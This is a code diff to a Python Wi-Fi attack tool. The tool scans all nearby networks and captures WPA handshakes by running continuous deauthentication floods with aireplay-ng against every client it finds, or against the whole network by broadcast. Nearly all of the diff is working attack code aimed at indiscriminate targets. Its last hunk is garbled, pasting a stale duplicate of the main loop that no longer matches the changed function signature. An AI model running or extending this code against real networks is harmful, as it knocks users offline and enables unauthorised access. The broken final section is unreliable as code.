@@ -67,35 +67,44 @@ class WiFiHandshakeCapture:
         except Exception as e:
             print(f"Error starting terminal: {e}")
             return False
-
     def parse_airodump_csv(self):
         networks = []
+        clients = []
         try:
             file_name = f"{self.output_dir}/{self.output_file}-01.csv"
             with open(file_name, mode='r', newline='') as file:
                 reader = csv.reader(file)
+                # Skip lines until the BSSID header is found
                 for row in reader:
                     if len(row) > 0 and row[0].strip() == "BSSID":
                         break
+                # Read network entries
                 for row in reader:
                     if len(row) < 14:
                         continue
                     if row[0].strip() == "Station MAC":
-                        break
+                        break  # Exit loop when client section starts
                     bssid = row[0].strip()
                     channel = row[3].strip()
                     essid = row[13].strip()
                     networks.append((bssid, channel, essid))
+                # Read client entries
+                for row in reader:
+                    if len(row) < 6:
+                        continue  # Skip incomplete client rows
+                    client_mac = row[0].strip()
+                    client_bssid = row[5].strip()
+                    clients.append((client_mac, client_bssid))
         except Exception as e:
             print(f"Error parsing CSV file: {e}")
-        return networks
+        return networks, clients
 
     def scan_networks(self):
         """Scan for nearby networks using airodump-ng"""
         try:
             # Start scanning process
             self.run_in_terminal(
-                f"sudo airodump-ng -w {self.output_dir}/{self.output_file} --output-format csv {self.mon_interface}",
+                f"sudo airodump-ng -w {self.output_dir}/{self.output_file} --output-format csv {self.mon_interface} --band a",
                 "WiFi Scanner"
             )
             
@@ -107,22 +116,24 @@ class WiFiHandshakeCapture:
                 if "airodump-ng" in ' '.join(proc.args):
                     proc.terminate()
             
-            return self.parse_airodump_csv()
-
+            networks, clients = self.parse_airodump_csv()
+            return networks, clients
         except Exception as e:
             print(f"Scan error: {e}")
-            return []
+            return [], []
 
-    def capture_handshake(self, bssid, name, channel):
-        """Capture handshake for a specific network"""
+    def capture_handshake(self, bssid, name, channel, target_clients):
+        """Capture handshake for a specific network with targeted client deauthentication"""
         print(f"Capturing handshake for {name} ({bssid})")
         bssid_no_dots = bssid.replace(":", "")
         output_file = f"handshake_{bssid_no_dots}"
         cap_path = f"{self.output_dir}/{output_file}"
 
         airodump_proc = None
-        aireplay_proc = None
-
+        aireplay_procs = []
+        if DEBUG:
+            if name != "TIM-24329479":
+                return False
         try:
             # Start capture process
             airodump_cmd = (
@@ -134,12 +145,29 @@ class WiFiHandshakeCapture:
             )
             self.processes.append(airodump_proc)
 
-            # Start deauth attack
-            aireplay_cmd = f"sudo aireplay-ng -D -0 12 -a {bssid} {self.mon_interface}"
-            aireplay_proc = subprocess.Popen(
-                ["xterm", "-title", f"Deauth: {name}", "-e", aireplay_cmd]
-            )
-            self.processes.append(aireplay_proc)
+            # Start deauth attacks for each client or broadcast if no clients
+            if target_clients:
+                for client_mac in target_clients:
+                    aireplay_cmd = (
+                        f"sudo aireplay-ng -D -0 0 -a {bssid} -c {client_mac} "
+                        f"{self.mon_interface}"
+                    )
+                    aireplay_proc = subprocess.Popen(
+                        ["xterm", "-title", f"Deauth {name} {client_mac}", "-e", aireplay_cmd]
+                    )
+                    self.processes.append(aireplay_proc)
+                    aireplay_procs.append(aireplay_proc)
+            else:
+                # Broadcast deauth if no clients found
+                aireplay_cmd = (
+                    f"sudo aireplay-ng -D -0 0 -a {bssid} "
+                    f"{self.mon_interface}"
+                )
+                aireplay_proc = subprocess.Popen(
+                    ["xterm", "-title", f"Deauth {name} Broadcast", "-e", aireplay_cmd]
+                )
+                self.processes.append(aireplay_proc)
+                aireplay_procs.append(aireplay_proc)
 
             # Handshake detection logic
             start_time = time.time()
@@ -172,10 +200,9 @@ class WiFiHandshakeCapture:
             # Cleanup processes
             if airodump_proc:
                 airodump_proc.terminate()
-            if aireplay_proc:
-                aireplay_proc.terminate()
-            time.sleep(1)  # Allow time for processes to terminate
-
+            for proc in aireplay_procs:
+                proc.terminate()
+        time.sleep(1)  # Allow time for processes to terminate
     def signal_handler(self, sig, frame):
         """Handle CTRL+C gracefully"""
         print("\n[!] Interrupt received, cleaning up...")
@@ -217,7 +244,7 @@ class WiFiHandshakeCapture:
         captured_targets = []
         try:
             while True:
-                networks = self.scan_networks()
+                networks, clients = self.scan_networks()
                 if not networks:
                     print("No networks found. Retrying in 10 seconds...")
                     time.sleep(10)
@@ -234,8 +261,10 @@ class WiFiHandshakeCapture:
                         captured_targets.append(essid)
                         continue
 
+                    # Get clients connected to this BSSID
+                    target_clients = [client[0] for client in clients if client[1] == bssid]
                     print(f"\nAttempting capture for: {essid}")
-                    if self.capture_handshake(bssid, essid, channel):
+                    if self.capture_handshake(bssid, essid, channel, target_clients):
                         print(f"Successfully captured handshake for {essid}")
                         captured_targets.append(essid)
                     else:
@@ -247,7 +276,44 @@ class WiFiHandshakeCapture:
         except KeyboardInterrupt:
             self.cleanup()
         finally:
-            self.cleanup()
+            self.cleanup()        """Main execution flow"""
+            if not self.enable_monitor_mode():
+                return
+            
+            captured_targets = []
+            try:
+                while True:
+                    networks = self.scan_networks()
+                    if not networks:
+                        print("No networks found. Retrying in 10 seconds...")
+                        time.sleep(10)
+                        continue
+
+                    for bssid, channel, essid in networks:
+                        if essid in captured_targets:
+                            continue
+
+                        # Check existing captures
+                        bssid_no_dots = bssid.replace(":", "")
+                        if any(bssid_no_dots in f for f in os.listdir(self.capture_dir)):
+                            print(f"Skipping {essid} - already captured")
+                            captured_targets.append(essid)
+                            continue
+
+                        print(f"\nAttempting capture for: {essid}")
+                        if self.capture_handshake(bssid, essid, channel):
+                            print(f"Successfully captured handshake for {essid}")
+                            captured_targets.append(essid)
+                        else:
+                            print(f"Failed to capture handshake for {essid}")
+
+                    print("\nCompleted scan cycle. Restarting in 10 seconds...")
+                    time.sleep(10)
+
+            except KeyboardInterrupt:
+                self.cleanup()
+            finally:
+                self.cleanup()
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
